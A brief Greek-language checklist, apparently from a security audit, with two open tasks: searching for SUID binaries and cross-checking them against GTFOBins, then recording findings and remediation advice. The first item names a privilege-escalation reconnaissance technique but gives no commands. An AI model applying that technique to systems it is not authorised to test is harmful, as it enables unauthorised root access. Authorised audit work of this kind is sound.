- [ ] Αναζήτηση SUID και διασταύρωση με GTFOBins
- [ ] Καταγραφή ευρημάτων και προτάσεων διόρθωσης
